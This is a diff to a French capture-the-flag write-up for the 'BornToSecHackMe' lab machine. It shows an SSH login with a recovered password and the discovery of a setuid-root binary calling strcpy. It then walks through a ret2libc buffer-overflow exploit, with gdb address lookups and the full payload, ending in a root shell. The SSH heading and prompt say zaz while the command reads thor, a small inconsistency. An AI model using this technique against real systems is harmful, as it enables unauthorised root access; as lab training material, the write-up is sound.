@@ -457,11 +457,158 @@ produit le bon mot de passe:
 ```
 $ printf "SLASH" | openssl md5
 646da671ca01bb5d84dbb5fb2238dc8e
-
-$ ssh zaz@$TARGET
-password: 646da671ca01bb5d84dbb5fb2238dc8e
-
-(zaz) $ ls -1
-exploit_me
-mail
 ```
+
+### SSH (zaz)
+
+```
+$ ssh thor@TARGET
+password: 646da671ca01bb5d84dbb5fb2238dc8e 
+```
+
+On commence a rechercher des infos:
+
+```
+zaz@BornToSecHackMe:~$ ls -l
+total 5
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+drwxr-x--- 3 zaz  zaz  107 Oct  8  2015 mail
+```
+
+On a un binaire setuid root. Lorsqu'on l'execute on obtient les permissions
+effectives de l'utilisateur root.
+
+Ce programme affiche le premier argument qu'on lui donne.
+Via un appel a nm, on observe un *appel interessant* a `strcpy()`.
+
+```
+zaz@BornToSecHackMe:~$ nm -D exploit_me
+0804850c R _IO_stdin_used
+         w __gmon_start__
+         U __libc_start_main
+         U puts
+         U strcpy
+```
+
+`strlen()` n'est pas linke. On essaye donc de realiser un buffer overflow:
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "a" * 250')
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaa
+Segmentation fault (core dumped)
+```
+
+On veut verifier l'absence d'ASLR:
+
+```
+zaz@BornToSecHackMe:~$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+Les conditions sont reunies pour exploiter ce buffer overflow via un ret2libc:
+il s'agit de faire retourner la fonction `main()` dans la fonction `system()` en
+lui donnant en parametre la chaine `/bin/sh`, tous deux presents dans la libc.
+
+On sait que le pointeur vers l'instruction de retour (la sauvegarde d'eip) est
+push sur la stack a `ebp` pour la frame courante.
+On sait aussi que sur une archi x86, les parametres de la fonctions sont pousses
+en ordre inverse (le premier parametre en dernier) sur la stack, juste avant
+la sauvegarde d' `ebp`.
+
+On veut donc setup la stack de la sorte (addresses les plus basses en haut):
+
++--------------------+
+|    copy buffer     |    \
+{        ...         }    |
+|                    |    |=> main() stack frame base
++--------------------+    |
+|  main return eip   |    |
+|  aka system addr   |    /
++--------------------+
+| system return eip  |    \
+|    aka dont care   |    |
++--------------------+    |=> system() stack frame base
+| system argument    |    |
+| aka "/bin/sh" addr |    |
++--------------------+    /
+| .................. |
+| .................. |
+
+
+Il nous faut l'addresse de `system()` et de `/bin/sh`:
+
+```
+zaz@BornToSecHackMe:~$ gdb ./exploit_me
+{...}
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+(gdb) r
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+(gdb) print &system
+$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+warning: Unable to access target memory at 0xb7fd3160, halting search.
+1 pattern found.
+```
+
++--------------------------------------+
+|            | addr bigE  | addr lilE  |
++--------------------------------------+
+| `system()` | 0xb7e6b060 | 0x60b0e6b7 |
+| `/bin/sh`  | 0xb7f8cc58 | 0x58ccf8b7 |
++------------+------------+------------+
+
+
+Notre parametre ressemblera donc a cela:
+
+"{fill n bytes}" + "\x60\xb0\xe6\xb7" + "padd" + "\x58\xcc\xf8\xb7"
+
+La chaine "padd" est ajoutee pour ecrire a l'emplacement du system return eip,
+qui ne nous interesse pas.
+
+
+Via un rapide `disass`, on observe que notre buffer est aligne sur 4 octets:
+
+```
+(gdb) disass
+Dump of assembler code for function main:
+   0x080483f4 <+0>:     push   %ebp
+   0x080483f5 <+1>:     mov    %esp,%ebp
+=> 0x080483f7 <+3>:     and    $0xfffffff0,%esp
+   0x080483fa <+6>:     sub    $0x90,%esp
+{...}
+   0x08048419 <+37>:    lea    0x10(%esp),%eax
+   0x0804841d <+41>:    mov    %eax,(%esp)
+   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
+{...}
+End of assembler dump.
+```
+
+On trouve le nombre de bytes a ecrire avant `eip` a tatons, en modifiant le
+nombre de dwords ecrits a l'aide de python, comme precedemment. Ce nombre m doit
+repondre aux conditions suivantes:
+
+- n == m * 4
+- n2 == (m - 1) * 4
+- avec n bytes, le programme segfault.
+- avec n2 bytes, le programme ne segfault pas.
+
+Finalement, on trouve m = 35.
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c \
+'print "a" * 4 * 35 + "\x60\xb0\xe6\xb7" + "padd" + "\x58\xcc\xf8\xb7"')
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`paddX
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),27(sudo),1005(zaz)
+```
+
+Nous voila en possession d'un shell ayant les permissions effectives de root !!
